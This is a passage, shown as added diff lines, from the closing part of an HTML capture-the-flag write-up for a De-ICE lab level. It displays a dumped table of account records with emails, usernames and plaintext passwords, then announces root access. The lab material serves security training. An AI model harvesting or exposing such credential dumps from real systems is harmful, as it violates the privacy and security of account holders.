+<span class="go">1006,Blake,Markus,sil3nt_gunn3r@yahoo.com,NY,mblake6947,268768924,129632,557</span>
+<span class="go">1007,Nash,Jillian,wiselife141@aol.com,NY,jnash0934,checkitout1,324672,315</span>
+<span class="go">1008,Atkins,Alison,double_a44@hotmail.com,NY,aatkins9087,gogogo123123,457094,124</span>
+<span class="go">1009,Oliver,Frank,fog_of_war0001@gmail.com,NY,foliver9385,falconpunch,783143,134</span>
+<span class="go">1010,Jones,Edith,msjones677@hotmail.com,NY,ejones7532,chris12345,632620,579</span>
+<span class="go">1011,Moore,Cody,aiprojectx@gmail.com,NY,dot_Cipher,crypTrace,101010,1337</span>
+</pre></div>
+</div>
+<p>And we are root and captured the new account data, so are done.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="de-ice4.html" class="btn btn-neutral float-right" title="3.5. De-ICE Level 4" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="de-ice6.html" class="btn btn-neutral" title="3.3. De-ICE Level 6" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
